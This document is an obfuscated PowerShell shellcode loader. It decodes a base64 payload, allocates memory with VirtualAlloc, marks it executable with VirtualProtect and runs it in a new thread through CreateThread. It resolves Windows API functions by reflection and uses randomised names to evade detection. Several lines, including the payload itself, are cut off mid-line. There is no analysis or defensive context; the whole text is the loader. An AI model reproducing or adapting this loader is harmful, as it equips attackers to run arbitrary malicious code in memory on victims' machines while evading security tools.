function l8y {
        Param ($qssn4, $jn)
        $jHNol = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetTyp>

        return $jHNol.GetMethod('GetProcAddress', [Type[]]@([System.Runtime.InteropServices.HandleRef], [String])).Invoke($null, @([System.Runtime.InteropServices.H>
}

function hnA {
        Param (
                [Parameter(Position = 0, Mandatory = $True)] [Type[]] $b32A6,
                [Parameter(Position = 1)] [Type] $deD = [Void]
        )

        $r6 = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBui>
        $r6.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $b32A6).SetImplementationFlags('Runtime, Managed>
        $r6.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $deD, $b32A6).SetImplementationFlags('Runtime, Managed')

        return $r6.CreateType()
}

[Byte[]]$qVL6_ = [System.Convert]::FromBase64String("/EiD5PDozAAAAEFRQVBSSDHSZUiLUmBRSItSGEiLUiBWSA+3SkpNMclIi3JQSDHArDxhfAIsIEHByQ1BAcHi7VJBUUiLUiCLQjxIAdBmgXgYCwI>
[Uint32]$ftbQ9 = 0
$own = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((l8y kernel32.dll VirtualAlloc), (hnA @([IntPtr], [UInt32], [UInt32], [UInt32]) ([Int>

[System.Runtime.InteropServices.Marshal]::Copy($qVL6_, 0, $own, $qVL6_.length)
if (([System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((l8y kernel32.dll VirtualProtect), (hnA @([IntPtr], [UIntPtr], [UInt32], [UInt32].MakeB>
        $geQZa = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((l8y kernel32.dll CreateThread), (hnA @([IntPtr], [UInt32], [IntPtr], [IntP>
        [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((l8y kernel32.dll WaitForSingleObject), (hnA @([IntPtr], [Int32]))).Invoke($geQZa,0x>
}
